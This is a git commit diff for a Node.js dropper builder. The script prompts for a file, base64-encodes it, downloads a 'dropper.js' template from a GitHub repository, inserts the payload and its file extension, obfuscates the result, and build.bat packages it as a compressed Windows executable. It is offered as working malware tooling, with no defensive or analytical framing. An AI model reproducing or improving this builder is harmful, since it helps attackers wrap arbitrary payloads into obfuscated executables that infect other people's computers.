8437dfc9a70ce171ce73a62f30fc8002a9c17fa0
KDot227 <kdot227@waifu.club>
2024-06-16 22:14:31 -0500

    done

---
+++ build.bat
@@ -0,0 +1,23 @@
+@echo off
+setlocal
+
+node -v
+if %errorlevel% neq 0 (
+    echo Node.js is not installed
+    start https://nodejs.org/en/download
+    pause
+    exit
+)
+
+call npm install
+if %errorlevel% neq 0 (
+    echo npm install failed
+    pause
+    exit
+)
+
+node src\main.js
+
+pkg out.js --compress GZip -t node18-win
+
+del out.js
--- src/main.js
+++ src/main.js
@@ -1,24 +1,50 @@
 const JavaScriptObfuscator = require('javascript-obfuscator');
 const fs = require('fs');
-const fetch = require('node-fetch');
+const https = require('https');
+const prompt = require('prompt-sync')();
 
-function getCode() {
-    return fetch('https://raw.githubusercontent.com/ChildrenOfYahweh/Bat2Exe/main/src/obfuscator.js')
-        .then(response => response.text())
-        .then(data => data);
+
+var file = prompt("Enter the file for dropping: ");
+
+var fileData = fs.readFileSync(file);
+
+
+async function getCode() {
+    try {
+        const res = await new Promise((resolve, reject) => {
+            https.get("https://raw.githubusercontent.com/Somali-Devs/Somali-Drip/main/src/static/dropper.js", (res) => {
+                let data = '';
+                res.on('data', (chunk) => {
+                    data += chunk;
+                });
+                res.on('end', () => {
+                    resolve(data);
+                });
+            }).on('error', (err) => {
+                reject(err);
+            });
+        });
+        return res;
+    } catch (err) {
+        console.error(err);
+        return "";
+    }
 }
 
-var code = getCode();
+async function main() {
+    var code = await getCode();
+    code = code.replace("YOUR_FILE_ENDING_HERE", file.split(".")[1]);
+    code = code.replace("BASE64ENCODEDSTUFFHERE", fileData.toString("base64"));
 
-var obfuscationResult = JavaScriptObfuscator.obfuscate(code, {
-    compact: true,
-    simplify: true,
-    target: 'node',
-    unicodeEscapeSequence: true
-});
+    var obfuscationResult = JavaScriptObfuscator.obfuscate(code, {
+        compact: true,
+        simplify: true,
+        target: 'node',
+        unicodeEscapeSequence: true
+    });
 
-//create the file fn
+    fs.writeFileSync("out.js", obfuscationResult.getObfuscatedCode(), "utf8");
+    //fs.writeFileSync("out.js", code, "utf8");
+}
 
-fs.writeFileSync(__dirname + "out.js", obfuscationResult.getObfuscatedCode(), "utf8");
-
-exit(0);
+main();
